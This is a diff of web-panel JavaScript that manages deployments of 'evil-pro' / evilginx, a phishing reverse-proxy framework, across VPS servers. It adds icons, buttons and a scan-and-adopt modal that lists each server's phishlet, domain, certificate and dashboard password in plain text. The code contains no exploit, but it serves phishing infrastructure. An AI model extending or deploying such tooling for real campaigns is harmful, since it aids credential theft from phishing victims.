@@ -66,10 +66,33 @@ var API = { get: function (p) { return api('GET', p); }, post: function (p, b) {
 
 var S = { page: 'servers', profiles: [], state: null, poll: null };
 
+var ICO = {
+  servers: '<rect x="3" y="4" width="18" height="7" rx="1.5"/><rect x="3" y="13" width="18" height="7" rx="1.5"/><path d="M7 7.5h.01M7 16.5h.01"/>',
+  activity: '<path d="M12 8v4l2.5 2"/><circle cx="12" cy="12" r="8.5"/>',
+  settings: '<circle cx="12" cy="12" r="3"/><path d="M12 3.5v2M12 18.5v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M3.5 12h2M18.5 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/>',
+  refresh: '<path d="M20 12a8 8 0 1 1-2.3-5.7"/><path d="M20 4v4h-4"/>',
+  theme: '<path d="M12 3v1.5M12 19.5V21M4.2 4.2l1 1M18.8 18.8l1 1M3 12h1.5M19.5 12H21M4.2 19.8l1-1M18.8 5.2l1-1"/><circle cx="12" cy="12" r="3.4"/>',
+  logout: '<path d="M15 4h3a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2h-3"/><path d="M10 8l-4 4 4 4M6 12h9"/>',
+  plus: '<path d="M12 5v14M5 12h14"/>',
+  wrench: '<path d="M14.7 6.3a4 4 0 1 0 5 5L21 21H3l8.4-8.4a4 4 0 0 0 3.3-6.3z"/>',
+  play: '<path d="M7 5l12 7-12 7z"/>',
+  stop: '<rect x="6" y="6" width="12" height="12" rx="1.5"/>',
+  restart: '<path d="M20 12a8 8 0 1 1-2.3-5.7"/><path d="M20 4v4h-4"/>',
+  scan: '<path d="M4 8V5.5A1.5 1.5 0 0 1 5.5 4H8M16 4h2.5A1.5 1.5 0 0 1 20 5.5V8M20 16v2.5a1.5 1.5 0 0 1-1.5 1.5H16M8 20H5.5A1.5 1.5 0 0 1 4 18.5V16"/><path d="M4 12h16"/>',
+  link: '<path d="M10 13a4 4 0 0 0 5.7 0l2.3-2.3a4 4 0 0 0-5.7-5.7L11 6.3"/><path d="M14 11a4 4 0 0 0-5.7 0L6 13.3a4 4 0 0 0 5.7 5.7L13 17.7"/>',
+  terminal: '<rect x="3" y="4" width="18" height="16" rx="1.5"/><path d="M7 9l2.5 2.5L7 14M12 15h5"/>',
+  trash: '<path d="M4 7h16M9 7V5h6v2M6 7l1 13h10l1-13"/>',
+  edit: '<path d="M4 20h4l10-10-4-4L4 16z"/><path d="M13.5 6.5l4 4"/>',
+  shield: '<path d="M12 3l7 3v5.2c0 4.3-2.9 8.1-7 9.3-4.1-1.2-7-5-7-9.3V6z"/><path d="M9.2 12.2l2 2 3.6-3.9"/>',
+  menu: '<path d="M4 7h16M4 12h16M4 17h16"/>',
+  ext: '<path d="M14 4h6v6"/><path d="M20 4l-9 9"/><path d="M18 14v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h5"/>'
+};
+function ico(n, cls) { if (!ICO[n]) return ''; return '<svg class="ic ' + (cls || '') + '" viewBox="0 0 24 24">' + ICO[n] + '</svg>'; }
+
 var NAV = [
-  { id: 'servers', label: 'Servers', ico: '▤' },
-  { id: 'activity', label: 'Activity', ico: '⧗' },
-  { id: 'settings', label: 'Settings', ico: '⚙' }
+  { id: 'servers', label: 'Servers', ico: 'servers' },
+  { id: 'activity', label: 'Activity', ico: 'activity' },
+  { id: 'settings', label: 'Settings', ico: 'settings' }
 ];
 var TITLES = {
   servers: ['Servers', 'Deploy and manage evil-pro on your VPS fleet'],
@@ -82,7 +105,7 @@ function renderNav() {
   NAV.forEach(function (n) {
     var badge = (n.id === 'servers' && S.profiles.length) ? S.profiles.length : '';
     h += '<div class="nav-item' + (S.page === n.id ? ' active' : '') + '" data-act="nav" data-id="' + n.id + '">' +
-      '<span>' + n.ico + '</span><span>' + n.label + '</span>' + (badge ? '<span class="count">' + badge + '</span>' : '') + '</div>';
+      ico(n.ico) + '<span>' + n.label + '</span>' + (badge ? '<span class="count">' + badge + '</span>' : '') + '</div>';
   });
   $('#nav').innerHTML = h;
 }
@@ -110,15 +133,20 @@ async function viewServers() {
           (p.last_error ? '<span class="k">Error</span><span class="v" style="color:var(--err)">' + esc(p.last_error) + '</span>' : '') +
         '</div>' +
         '<div class="actions mt14">' +
-          '<button class="btn sm primary" data-act="manage" data-id="' + p.id + '">Manage</button>' +
-          '<button class="btn sm" data-act="deploy" data-id="' + p.id + '">' + (p.last_status ? 'Re-deploy' : 'Install') + '</button>' +
-          '<button class="btn sm" data-act="update" data-id="' + p.id + '">Update</button>' +
-          '<button class="btn sm" data-act="handoff" data-id="' + p.id + '">Hand-off</button>' +
-          '<button class="btn sm" data-act="status" data-id="' + p.id + '">Status</button>' +
-          '<button class="btn sm" data-act="logs" data-id="' + p.id + '">Logs</button>' +
-          '<button class="btn sm" data-act="restart" data-id="' + p.id + '">Restart</button>' +
-          '<button class="btn sm" data-act="edit" data-id="' + p.id + '">Edit</button>' +
-          '<button class="btn sm danger" data-act="del" data-id="' + p.id + '">Delete</button>' +
+          '<button class="btn sm primary" data-act="manage" data-id="' + p.id + '">' + ico('terminal') + ' Manage</button>' +
+          (p.last_status && p.last_status !== 'unreachable'
+            ? '<button class="btn sm" data-act="update" data-id="' + p.id + '">' + ico('refresh') + ' Update</button>' +
+              '<button class="btn sm" data-act="handoff" data-id="' + p.id + '">' + ico('link') + ' Hand-off</button>'
+            : '<button class="btn sm" data-act="deploy" data-id="' + p.id + '">' + ico('play') + ' Install</button>') +
+          '<button class="btn sm" data-act="discover" data-id="' + p.id + '">' + ico('scan') + ' Scan</button>' +
+          '<button class="btn sm" data-act="edit" data-id="' + p.id + '">' + ico('edit') + ' Edit</button>' +
+        '</div>' +
+        '<div class="actions mt8">' +
+          '<button class="btn xs sm" data-act="status" data-id="' + p.id + '">Status</button>' +
+          '<button class="btn xs sm" data-act="repair" data-id="' + p.id + '">Repair config</button>' +
+          '<button class="btn xs sm" data-act="logs" data-id="' + p.id + '">Logs</button>' +
+          '<button class="btn xs sm" data-act="restart" data-id="' + p.id + '">Restart</button>' +
+          '<button class="btn xs sm danger" data-act="del" data-id="' + p.id + '">Delete</button>' +
         '</div>' +
       '</div></div>';
   });
@@ -271,6 +299,40 @@ function pollJob(id) {
   }).catch(function (e) { $('#jobResult').innerHTML = '<div class="badge err">' + esc(e.message) + '</div>'; });
 }
 
+/* ---------------- discovery / adopt ---------------- */
+function showDiscovery(d, id, fromTest) {
+  d = d || {};
+  if (!d.found) {
+    openModal('Scan result',
+      '<div class="badge warn">no existing deployment found</div>' +
+      '<div class="hint mt8">' + esc(d.error || 'The server is reachable but no evil-pro / evilginx install was detected.') + '</div>' +
+      '<div class="actions mt14"><button class="btn primary" data-act="deploy" data-id="' + id + '">Install fresh</button>' +
+      '<button class="btn" data-act="modal-close">Close</button></div>');
+    return;
+  }
+  function kv(k, v, cls) { return '<span class="k">' + esc(k) + '</span><span class="v ' + (cls || '') + '">' + esc(v || '—') + '</span>'; }
+  var notes = (d.notes || []).map(function (n) { return '<div class="hint">• ' + esc(n) + '</div>'; }).join('');
+  openModal('Existing deployment found',
+    '<div class="badge ok">detected</div>' +
+    '<div class="hint mt8">Importing keeps the server exactly as it is — nothing is reinstalled.</div>' +
+    '<div class="kv mt14">' +
+      kv('Install dir', d.install_dir) +
+      kv('Domain', d.domain) +
+      kv('Phishlet', d.phishlet) +
+      kv('Service', d.service_active + (d.service_enabled ? ' / ' + d.service_enabled : '')) +
+      kv('Version', d.version) +
+      kv('Certificate', d.cert_subject ? d.cert_subject + ' (expires ' + d.cert_expiry + ')' : 'none') +
+      kv('Listens', d.ports) +
+      kv('Engine API', d.engine_url + (d.engine_ok ? ' (reachable)' : ' (NOT reachable)'), d.engine_ok ? '' : 'badge warn') +
+      kv('Dashboard login', d.dashboard_user + ' / ' + (d.dashboard_pass || '(empty)')) +
+    '</div>' + notes +
+    '<div class="actions mt14">' +
+      '<button class="btn primary" data-act="adopt" data-id="' + id + '">' + ico('plus') + ' Adopt this server</button>' +
+      '<button class="btn" data-act="update" data-id="' + id + '">Re-deploy engine</button>' +
+      '<button class="btn" data-act="modal-close">Close</button>' +
+    '</div>');
+}
+
 /* ---------------- modal / drawer ---------------- */
 function openModal(title, body, wide) {
   $('#modalBox').className = 'box' + (wide ? ' wide' : '');
@@ -297,8 +359,21 @@ var ACTIONS = {
 
   new: function () { editProfile(null); },
   edit: function (id) { var p = S.profiles.find(function (x) { return x.id === id; }); editProfile(p); },
-  test: function (id) { run(async function () { var d = await API.post('/api/profiles/' + id + '/test'); toast('reachable: ' + d.probe.os + ' ' + d.probe.arch, 'ok'); }); },
-  'test-profile': function () { var p = collectProfile(); run(async function () { if (!p.id) { var s = await API.post('/api/profiles', p); p.id = s.id; } else { await API.post('/api/profiles', p); } var d = await API.post('/api/profiles/' + p.id + '/test'); toast('reachable: ' + d.probe.os + ' ' + d.probe.arch, 'ok'); }); },
+  test: function (id) { run(async function () { var d = await API.post('/api/profiles/' + id + '/test'); showDiscovery(d.discovery, id, true); }); },
+  discover: function (id) { run(async function () { var d = await API.post('/api/profiles/' + id + '/discover'); showDiscovery(d, id, false); }); },
+  adopt: function (id) { run(async function () { await API.post('/api/profiles/' + id + '/adopt', {}); toast('server adopted - its settings were imported', 'ok'); closeModal(); render(); }); },
+  repair: function (id) { run(async function () { var r = await API.post('/api/profiles/' + id + '/repair'); jobModal(r.job); }); },
+  'hostkey-reset': function (id) { run(async function () { await API.post('/api/profiles/' + id + '/reset-hostkey'); toast('pinned host key cleared', 'ok'); }); },
+  'test-profile': function () {
+    var p = collectProfile();
+    run(async function () {
+      var saved;
+      if (!p.id) { saved = await API.post('/api/profiles', p); p.id = saved.id; } else { saved = await API.post('/api/profiles', p); }
+      var d = await API.post('/api/profiles/' + p.id + '/test');
+      closeDrawer();
+      showDiscovery(d.discovery, p.id, true);
+    });
+  },
   'cf-verify': function () { var p = collectProfile(); run(async function () { var d = await API.post('/api/cf/verify', { token: p.cf_token, domain: p.domain }); toast('Cloudflare OK' + (d.zone_id ? ' · zone found' : ''), 'ok'); }); },
   'save-profile': function () { run(async function () { var p = collectProfile(); var s = await API.post('/api/profiles', p); toast('saved', 'ok'); closeDrawer(); S.profiles = (await API.get('/api/profiles')).profiles; render(); if (!p.id) editProfile(s); }); },
   del: function (id) { if (confirm('Delete this server from the panel? (the VPS is not touched)')) run(async function () { await API.del('/api/profiles/' + id); toast('deleted', 'ok'); render(); }); },
@@ -364,7 +439,9 @@ var rendering = false;
 async function render() {
   if (rendering) return; rendering = true;
   S.page = page();
-  setHeader(TITLES[S.page][0], TITLES[S.page][1], '<button class="btn sm" data-act="theme">◐</button><button class="btn sm" data-act="logout">Logout</button>');
+  setHeader(TITLES[S.page][0], TITLES[S.page][1],
+    '<button class="btn icon" data-act="theme" title="Toggle light/dark">' + ico('theme') + '</button>' +
+    '<button class="btn sm" data-act="logout">' + ico('logout') + ' Logout</button>');
   renderNav();
   $('#foot').textContent = S.state ? ('v' + S.state.version) : '';
   var c = $('#content'); c.innerHTML = '<div class="empty">loading…</div>';
@@ -384,6 +461,7 @@ document.addEventListener('click', function (e) {
   fn(t.getAttribute('data-id'), t);
 });
 $('#scrim').addEventListener('click', function () { closeDrawer(); closeModal(); });
+var mb = $('#menuBtn'); if (mb) mb.addEventListener('click', function () { var s = document.querySelector('.side'); if (s) s.classList.toggle('open'); });
 window.addEventListener('hashchange', render);
 
 (async function init() {
